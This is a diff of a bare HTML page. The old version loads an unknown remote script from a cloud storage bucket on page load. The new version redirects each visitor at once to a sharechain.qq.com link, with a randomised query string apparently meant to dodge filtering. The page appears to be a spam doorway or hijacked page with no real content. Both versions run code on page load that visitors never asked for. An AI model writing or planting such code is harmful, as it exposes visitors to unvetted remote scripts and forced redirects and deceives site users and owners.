@@ -1,5 +1,23 @@
 <html>
 <script>
-document.write('<script src="https://vcsstore.oss-cn-hangzhou.aliyuncs.com/bin/plugins/audio/ztkzhe.js?v='+Math.random()+'"><\/script>');
+
+
+var urls=[
+  	'https://sharechain.qq.com/335f495f55b2e112b68c050938c86c26?{wwww}{nnnn}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
 </script>
-</html>
+<html>
